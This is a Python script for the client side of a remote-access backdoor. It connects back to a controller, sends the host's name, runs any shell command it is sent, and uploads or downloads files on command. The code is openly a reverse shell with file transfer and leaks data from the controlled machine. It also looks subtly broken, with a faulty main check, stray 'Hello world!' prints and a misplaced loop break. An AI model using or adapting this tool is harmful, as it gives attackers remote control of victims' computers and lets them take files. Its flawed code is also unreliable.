#!/usr/bin/python3  
# -*- coding: utf-8 -*-  
  
import socket  
import struct  
import os  
import subprocess  
  
def Execommand(clientSocket):  
    while True:  
        try:  
            # Receive a command from the clientSocket  
            command = clientSocket.recv(1024).decode()  
              
            # Split the command into command and arguments  
            commList = command.split()  
              
            # Exit the command execution loop when 'exit' is received  
            if commList[0] == 'exit':  
                break  
              
            # Change directory using os.chdir when 'cd' command is received  
            elif commList[0] == 'cd':  
                os.chdir(commList[1])  
                  
                # After changing directory, send the current working directory to the clientSocket  
                clientSocket.sendall(os.getcwd().encode())  
            else:  
                # Execute the command using subprocess and send the output to the clientSocket  
                clientSocket.sendall(subprocess.check_output(command, shell=True))  
        except Exception as message:  
            # If an error occurs, send a failure message to the clientSocket  
            clientSocket.sendall("Failed to execute, please check your command!!!".encode())  
        finally:  
            # Continue the loop if an exception occurs or when 'exit' is received  
            continue

def UploadFile(clientSocket, filepath):  
    while True:  
        uploadFilePath = filepath  
        if os.path.isfile(uploadFilePath):  
            # Send file information first to prevent packet concatenation  
            # Define file information, 128s represents the length of the filename which is 128 bytes, 'l' represents the file size in int type  
            # Pack and send the file name and size information to the receiver  
            fileInfo = struct.pack('128sl', bytes(os.path.basename(uploadFilePath), 'utf-8'), os.stat(uploadFilePath).st_size)  
            clientSocket.sendall(fileInfo)  
            print('[+]FileInfo send success! name:{0} size:{1}'.format(os.path.basename(uploadFilePath), os.stat(uploadFilePath).st_size))  
            # Start uploading the file content  
            print('[+]start uploading...')  
            with open(uploadFilePath, 'rb') as f:  
                while True:  
                    # Read the file in chunks to prevent memory overflow when dealing with large files  
                    data = f.read(1024)  
                    if not data:  
                        print("[+]File Upload Complete!!!")  
                        break  
                    clientSocket.sendall(data)  
                    break

def DownloadFile(clientSocket):  
    while True:  
        # Receive file information to parse it  
        # Length is arbitrary, receiving file information first mainly to prevent packet concatenation  
        fileInfo = clientSocket.recv(struct.calcsize('128sl'))  
          
        if fileInfo:  
            # Unpack the received file information using the same format (128sl)  
            fileName, fileSize = struct.unpack('128sl', fileInfo)  
              
            # Remove extra null characters from the file name  
            fileName = fileName.decode().strip('\00')  
              
            # Define the path to store the downloaded file, './' represents the current directory  
            newFilename = os.path.join('./', fileName)  
            print('[+]FileInfo Receive over! name:{0} size:{1}'.format(fileName, fileSize))  
              
            # Start receiving the file content  
            print('[+]start receiving...')  
            with open(newFilename, 'wb') as f:  
                recvdSize = 0  
                while recvdSize != fileSize:  
                    if fileSize - recvdSize > 1024:  
                        data = clientSocket.recv(1024)  
                        f.write(data)  
                        recvdSize += len(data)  
                    else:  
                        data = clientSocket.recv(fileSize - recvdSize)  
                        f.write(data)  
                        recvdSize = fileSize  
                print("[+]File Receiveover!!!")  
                break

def TransferFiles(clientSocket):  
    while True:  
        # Receive a command from the clientSocket  
        command = clientSocket.recv(1024).decode()  
          
        # Split the command into command and arguments  
        commList = command.split()  
          
        # Exit the file transfer loop when 'exit' is received  
        if commList[0] == 'exit':  
            break  
          
        # If the command is 'download', it means the main controller needs to get a file from the controlled device.  
        elif commList[0] == 'download':  
            UploadFile(clientSocket, commList[1])  
        elif commList[0] == 'upload':  
            DownloadFile(clientSocket)

    print("Hello world!")
    
if __name__ == 'main':  # 连接主控端  
    print("Hello world!")
      
    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
    clientSocket.connect(('127.0.0.1', 6666))  
      
    # 发送被控端的主机名  
    hostName = subprocess.check_output("hostname")  
    clientSocket.sendall(hostName)  
    print("Hello world!")
      
    print("[*]Waiting instruction...")  
    while True:  # 等待主控端指令  
        # 接收主控端的指令，并进入相应的模块  
        # 接收到的内容为bytes型，需要将decode转换为str型  
        instruction = clientSocket.recv(10).decode()  
        if instruction == '1':  
            Execommand(clientSocket)  
        elif instruction == '2':  
            TransferFiles(clientSocket)  
        elif instruction == 'exit':  
            break  
        else:  
            pass  

    clientSocket.close()